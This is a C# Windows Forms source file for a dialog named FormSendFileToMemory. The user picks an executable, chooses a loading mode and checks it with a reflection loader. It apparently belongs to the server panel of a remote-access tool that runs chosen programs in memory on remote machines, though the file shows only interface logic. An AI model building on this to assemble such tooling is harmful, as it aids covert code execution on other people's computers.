using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Reflection;
using Server.Helper;

namespace Server
{
    public partial class FormSendFileToMemory : Form
    {
        public bool isOK = false;
        public FormSendFileToMemory()
        {
            InitializeComponent();
        }

        private void SendFileToMemory_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (comboBox1.SelectedIndex)
            {
                case 0:
                    label3.Visible = false;
                    comboBox2.Visible = false;
                    break;
                case 1:
                    label3.Visible = true;
                    comboBox2.Visible = true;
                    break;

            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog O = new OpenFileDialog()
            {
                Filter = "(*.exe)|*.exe"
            };
            if (O.ShowDialog() == DialogResult.OK)
            {
                toolStripStatusLabel1.Text = Path.GetFileName(O.FileName);
                toolStripStatusLabel1.Tag = O.FileName;
                toolStripStatusLabel1.ForeColor = Color.Green;
                isOK = true;
                if (comboBox1.SelectedIndex == 0)
                {
                    try
                    {
                        new ReferenceLoader().AppDomainSetup(O.FileName);
                        isOK = true;
                    }
                    catch
                    {
                        toolStripStatusLabel1.ForeColor = Color.Red;
                        toolStripStatusLabel1.Text += " Invalid!";
                        isOK = false;
                    }
                }
            }
            else
            {
                toolStripStatusLabel1.Text = "";
                toolStripStatusLabel1.ForeColor = Color.Black;
                isOK = true;
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (isOK)
                this.Hide();
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            isOK = false;
            this.Hide();
        }
    }
}
